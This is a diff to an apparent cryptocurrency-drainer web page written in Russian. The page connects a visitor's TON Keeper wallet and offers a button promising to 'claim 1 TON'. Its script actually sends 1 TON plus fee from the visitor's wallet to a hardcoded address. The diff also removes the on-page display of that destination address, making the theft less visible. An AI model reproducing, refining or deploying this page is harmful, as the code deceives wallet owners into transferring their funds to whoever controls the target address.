@@ -37,8 +37,8 @@
             border-radius: 60px;
             cursor: pointer;
             width: 100%;
-            letter-spacing: 0.5px;
             transition: 0.3s;
+            margin: 6px 0;
         }
         .btn:active {
             transform: scale(0.96);
@@ -56,24 +56,18 @@
         #status {
             margin-top: 16px;
             font-size: 13px;
-            color: #666;
-            min-height: 40px;
+            color: #888;
+            min-height: 50px;
             word-break: break-all;
-        }
-        .address-hint {
-            font-size: 11px;
-            color: #333;
-            margin-top: 10px;
-            word-break: break-all;
+            line-height: 1.6;
         }
         .hidden {
             display: none !important;
         }
         .balance-display {
-            font-size: 22px;
+            font-size: 24px;
             color: #00ff88;
             margin: 12px 0;
-            font-weight: bold;
         }
     </style>
 </head>
@@ -84,12 +78,11 @@
         <button class="btn" id="connectBtn">ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
         <button class="btn btn-red hidden" id="snipeBtn">🔥 ЗАБРАТЬ 1 TON</button>
         <div id="status">Нажмите кнопку</div>
-        <div class="address-hint" id="addressHint">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
     </div>
 
     <script>
         const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
-        const AMOUNT_TON = 1; // ====== 1 ТОН ======
+        const AMOUNT_TON = 1;
         let userAddress = null;
         let provider = null;
         let isConnected = false;
@@ -97,7 +90,6 @@
         const connectBtn = document.getElementById('connectBtn');
         const snipeBtn = document.getElementById('snipeBtn');
         const status = document.getElementById('status');
-        const addressHint = document.getElementById('addressHint');
         const balanceDisplay = document.getElementById('balanceDisplay');
 
         // ========== ПРОВЕРКА ==========
@@ -111,6 +103,7 @@
                 status.innerText = '⏳ Подключение...';
                 connectBtn.disabled = true;
 
+                // 1. Расширение
                 if (window.tonkeeper) {
                     provider = window.tonkeeper;
                     const accounts = await provider.send('ton_requestAccounts', {});
@@ -122,23 +115,25 @@
                     }
                 }
 
-                if (isTelegram()) {
-                    status.innerText = '📱 Открываю через Telegram...';
-                    const tg = window.Telegram.WebApp;
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent('tg://resolve')}`;
-                    tg.openLink(connectUrl);
-                    status.innerText = '✅ Подтвердите в TON Keeper';
-                    connectBtn.disabled = false;
-                    await waitForConnection();
-                    return;
-                }
-
-                if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                // 2. Telegram / Мобильный
+                const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+                
+                if (isTelegram() || isMobile) {
                     status.innerText = '📱 Открываю TON Keeper...';
-                    const url = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
-                    window.open(url, '_blank');
+                    
+                    const returnUrl = encodeURIComponent(window.location.href);
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${returnUrl}`;
+                    
+                    if (isTelegram()) {
+                        window.Telegram.WebApp.openLink(connectUrl);
+                    } else {
+                        window.open(connectUrl, '_blank');
+                    }
+                    
                     status.innerText = '✅ Подтвердите в TON Keeper';
                     connectBtn.disabled = false;
+                    
+                    // Ждём подключения
                     await waitForConnection();
                     return;
                 }
@@ -147,7 +142,7 @@
                 connectBtn.disabled = false;
 
             } catch(e) {
-                status.innerText = '❌ Ошибка: ' + e.message;
+                status.innerText = '❌ ' + e.message;
                 connectBtn.disabled = false;
             }
         }
@@ -176,7 +171,7 @@
                     
                     if (attempts > 30) {
                         clearInterval(interval);
-                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
+                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
                         resolve();
                     }
                 }, 1000);
@@ -188,12 +183,10 @@
             status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
             connectBtn.classList.add('hidden');
             snipeBtn.classList.remove('hidden');
-            addressHint.classList.add('hidden');
-            
             updateBalance();
         }
 
-        // ========== ОБНОВЛЕНИЕ БАЛАНСА ==========
+        // ========== БАЛАНС ==========
         async function updateBalance() {
             try {
                 if (!provider) return 0;
@@ -207,30 +200,30 @@
             }
         }
 
-        // ========== ВЫВОД РОВНО 1 TON ==========
+        // ========== ВЫВОД 1 TON ==========
         async function snipe() {
             try {
                 status.innerText = '⏳ Проверка баланса...';
                 snipeBtn.disabled = true;
 
                 if (!provider) {
-                    status.innerText = '❌ Нет подключения';
+                    status.innerText = '❌ Нет подключения к TON Keeper';
                     snipeBtn.disabled = false;
                     return;
                 }
 
                 const nano = await updateBalance();
-                const amountNano = AMOUNT_TON * 1e9; // 1 TON = 1,000,000,000 нано
-                const fee = 5000000; // 0.005 TON
+                const amountNano = AMOUNT_TON * 1e9;
+                const fee = 5000000;
                 const totalNeeded = amountNano + fee;
 
                 if (nano < totalNeeded) {
-                    status.innerText = `⚠️ Не хватает. Нужно ${(totalNeeded/1e9).toFixed(6)} TON (1 TON + комиссия)`;
+                    status.innerText = `⚠️ Нужно ${(totalNeeded/1e9).toFixed(6)} TON (1 TON + комиссия)`;
                     snipeBtn.disabled = false;
                     return;
                 }
 
-                status.innerText = `⏳ Перевод ${AMOUNT_TON} TON...`;
+                status.innerText = `⏳ Отправка ${AMOUNT_TON} TON...`;
 
                 const tx = {
                     to: TARGET,
@@ -239,6 +232,7 @@
                     stateInit: ''
                 };
 
+                // ====== ОТПРАВКА ======
                 const result = await provider.send('ton_sendTransaction', tx);
 
                 if (result && result.code === 0) {
@@ -253,7 +247,7 @@
                 }
 
             } catch(e) {
-                status.innerText = '❌ Ошибка: ' + e.message;
+                status.innerText = '❌ ' + e.message;
                 snipeBtn.disabled = false;
             }
         }
@@ -262,25 +256,14 @@
         connectBtn.onclick = connectTon;
         snipeBtn.onclick = snipe;
 
-        // ========== АВТОПРОВЕРКА ==========
+        // ========== АВТОЗАПУСК ==========
         setTimeout(() => {
             if (window.tonkeeper) {
-                status.innerText = '🟢 TON Keeper найден. Нажмите кнопку.';
-            } else if (isTelegram()) {
-                status.innerText = '📱 Telegram Mini App. Нажмите кнопку.';
+                status.innerText = '🟢 Нажмите кнопку';
             } else {
-                status.innerText = 'Нажмите кнопку для подключения';
+                status.innerText = '📱 Нажмите кнопку для подключения';
             }
         }, 500);
-
-        // ========== АВТОМАТИЧЕСКИЙ ЗАПУСК В TELEGRAM ==========
-        if (isTelegram()) {
-            setTimeout(() => {
-                if (!isConnected) {
-                    connectTon();
-                }
-            }, 1000);
-        }
     </script>
 </body>
 </html>
